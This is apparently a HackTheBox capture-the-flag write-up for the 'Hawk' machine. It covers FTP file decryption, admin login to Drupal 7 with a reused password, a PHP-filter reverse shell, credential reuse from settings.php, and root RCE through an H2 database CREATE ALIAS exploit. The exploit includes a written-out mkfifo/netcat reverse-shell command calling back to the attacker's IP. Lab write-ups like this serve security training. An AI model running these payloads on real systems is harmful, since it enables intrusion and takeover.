# HackTheBox - Hawk

## Nmap Scan

```
./nmapAutomator.sh 10.129.95.193 -t All

Running all scans on 10.129.95.193

Host is likely running Linux


---------------------Starting Port Scan-----------------------



PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
80/tcp   open  http
8082/tcp open  blackice-alerts



---------------------Starting Script Scan-----------------------



PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxr-xr-x    2 ftp      ftp          4096 Jun 16  2018 messages
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.10.14.45
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 e4:0c:cb:c5:a5:91:78:ea:54:96:af:4d:03:e4:fc:88 (RSA)
|   256 95:cb:f8:c7:35:5e:af:a9:44:8b:17:59:4d:db:5a:df (ECDSA)
|_  256 4a:0b:2e:f7:1d:99:bc:c7:d3:0b:91:53:b9:3b:e2:79 (ED25519)
80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-robots.txt: 36 disallowed entries (15 shown)
| /includes/ /misc/ /modules/ /profiles/ /scripts/ 
| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt 
| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt 
|_/LICENSE.txt /MAINTAINERS.txt
|_http-title: Welcome to 192.168.56.103 | 192.168.56.103
|_http-generator: Drupal 7 (http://drupal.org)
|_http-server-header: Apache/2.4.29 (Ubuntu)
8082/tcp open  http    H2 database http console
|_http-title: H2 Console
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel




---------------------Starting Full Scan------------------------
                                                                                                                                                                                                                                           


PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
80/tcp   open  http
5435/tcp open  sceanics
8082/tcp open  blackice-alerts
9092/tcp open  XmlIpcRegSvc



Making a script scan on extra ports: 5435, 9092
                                                                                                                                                                                                                                            


PORT     STATE SERVICE       VERSION
5435/tcp open  tcpwrapped
9092/tcp open  XmlIpcRegSvc?
```

Interesting attack surface here: FTP with anonymous login, Drupal 7 on port 80, an H2 database console on 8082, and a couple of extra ports (5435, 9092) related to H2. First thing, add the domain to `/etc/hosts`.

![Adding hawk.htb to /etc/hosts](../HTB_imgs/Pasted%20image%2020260702003056.png)

---

# FTP

Nmap already told us anonymous FTP is allowed. Logged in and found a `messages` directory containing a hidden file called `.drupal.txt.enc`. Downloaded it.

![FTP anonymous login — downloading .drupal.txt.enc](../HTB_imgs/Pasted%20image%2020260702003357.png)

Ran `file` on it and it's OpenSSL encrypted data with a salted password, base64-encoded.

![file command — openssl enc'd data with salted password](../HTB_imgs/Pasted%20image%2020260702003541.png)

Time to brute-force the encryption password. Used a bash one-liner that tries each password from `rockyou.txt` against the file using `openssl enc -d -a -AES-256-CBC`. The password turned out to be `friends`.

![Cracking the encryption — password is friends](../HTB_imgs/Pasted%20image%2020260702004045.png)

Decrypted the file and it contains a message addressed to Daniel with a password for "the portal": `PencilKeyboardScanner123`.

![Decrypted content — password PencilKeyboardScanner123 for Daniel](../HTB_imgs/Pasted%20image%2020260702004205.png)

---

# Port 80

Port 80 is running **Drupal 7**. The login page is at the root.

![Drupal 7 login page](../HTB_imgs/Pasted%20image%2020260702004455.png)

Tried logging in as `daniel` with the password we found, didn't work.

![Login failed with daniel](../HTB_imgs/Pasted%20image%2020260702004642.png)

Tried `admin` with the same password and we're in. Password reuse across different accounts is always worth trying.

![Logged in as admin](../HTB_imgs/Pasted%20image%2020260702004739.png)

## Getting a Shell via Drupal

As an admin on Drupal 7, we can enable the **PHP filter** module under Modules. This lets us execute arbitrary PHP code through content pages.

![Enabling PHP filter module](../HTB_imgs/Pasted%20image%2020260702005015.png)

Went to Add Content > Article, and set the Text format to **PHP code**. This is where we'll paste our reverse shell payload.

![Create Article — text format set to PHP code](../HTB_imgs/Pasted%20image%2020260702005143.png)

Pasted pentestmonkey's PHP reverse shell into the body field, pointing back to our Kali IP on port 9001.

![PHP reverse shell payload in the article body](../HTB_imgs/Pasted%20image%2020260702005401.png)

Set up our `nc` listener.

![Netcat listener waiting on port 9001](../HTB_imgs/Pasted%20image%2020260702005436.png)

Hit Save on the article and caught the shell as `www-data`.

![Reverse shell as www-data](../HTB_imgs/Pasted%20image%2020260702005515.png)

## Lateral Movement to Daniel

First thing I tried was `su daniel` with the password from the encrypted file (`PencilKeyboardScanner123`) — authentication failure. The portal password doesn't work for the system account.

![su daniel failed with PencilKeyboardScanner123](../HTB_imgs/Pasted%20image%2020260702005808.png)

After poking around, found Daniel's actual password in Drupal's `settings.php` file (the database config section). The password `drupal4hawk` was set for the MySQL connection.

![settings.php — database password drupal4hawk](../HTB_imgs/Pasted%20image%2020260702010301.png)

Used `su daniel` with `drupal4hawk` and it worked, but it dropped us into a **Python shell** instead of bash. Daniel's default shell is set to Python.

![su daniel — lands in Python interpreter](../HTB_imgs/Pasted%20image%2020260702010425.png)

Easy fix  just spawn bash from inside the Python shell with `import os; os.system("/bin/bash")`.

![Spawning bash from Python shell](../HTB_imgs/Pasted%20image%2020260702010635.png)

## User Flag

![User flag](../HTB_imgs/Pasted%20image%2020260702010655.png)

---

# Privilege Escalation

## Enumeration

Set up the HTTP server on Kali to transfer privesc tools.

![Python HTTP server for privesc tools](../HTB_imgs/Pasted%20image%2020260702010859.png)

Transferred and ran `linpeas.sh`. The key finding: **H2 database** is running as **root** (`/usr/bin/java -jar /opt/h2/bin/h2-1.4.196.jar`). We already saw port 8082 externally, but the H2 console blocks remote connections (`webAllowOthers` is disabled).

![linpeas — H2 running as root process](../HTB_imgs/Pasted%20image%2020260702011641.png)

Confirmed externally trying to access the H2 Console from our browser shows the "remote connections disabled" message.

![H2 Console — webAllowOthers disabled](../HTB_imgs/Pasted%20image%2020260702011841.png)

## SSH Port Forwarding

Since the H2 console only accepts localhost connections, we can forward port 8082 through SSH using daniel's credentials:

```bash
ssh -L 8082:localhost:8082 daniel@hawk.htb
```

![SSH local port forward](../HTB_imgs/Pasted%20image%2020260702012012.png)

Now accessing `http://127.0.0.1:8082` on our machine shows the full H2 login console — because the connection now appears to come from localhost on the target.

![H2 Console via localhost — full login form](../HTB_imgs/Pasted%20image%2020260702012058.png)

## Abusing H2 Database for RCE

Following [this blog post](https://mthbernardes.github.io/rce/2018/03/14/abusing-h2-database-alias.html) on abusing H2 for RCE. Connected to a non-existent database (`jdbc:h2:~/test`) with an empty password  H2 just creates it and lets us in.

![H2 Console — connected with fake database](../HTB_imgs/Pasted%20image%2020260702012511.png)

The exploit uses `CREATE ALIAS` to define a Java function that runs system commands, then `CALL` it to execute. Tried a reverse shell payload first:

```sql
CREATE ALIAS SHELLEXEC AS $$ String shellexec(String cmd) throws java.io.IOException { java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter("\\A"); return s.hasNext() ? s.next() : ""; }$$;
CALL SHELLEXEC('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.45 1235 >/tmp/f')
```

![SHELLEXEC payload in H2 SQL console](../HTB_imgs/Pasted%20image%2020260702012700.png)

That didn't work  likely because `Runtime.exec()` doesn't handle pipes/redirects well in a single string. So I changed approach: created a `chmod.py` script on Kali that runs `chmod +s /bin/bash`, transferred it to `/tmp` on the target, and tried running it through H2.

![chmod.py transferred to /tmp on target](../HTB_imgs/Pasted%20image%2020260702013201.png)

Ran it through `CALL SHELLEXEC('python3 /tmp/chmod.py')` — didn't work either.

![Running chmod.py via SHELLEXEC — failed](../HTB_imgs/Pasted%20image%2020260702013645.png)

Switched to running a PHP reverse shell script from `/tmp` instead, since PHP is installed on the box (Drupal needs it). This time it worked.

![PHP reverse shell via SHELLEXEC — worked](../HTB_imgs/Pasted%20image%2020260702014131.png)

Caught the shell as root.

![Root shell received](../HTB_imgs/Pasted%20image%2020260702014143.png)

## Root Flag

![Root flag](../HTB_imgs/Pasted%20image%2020260702014221.png)
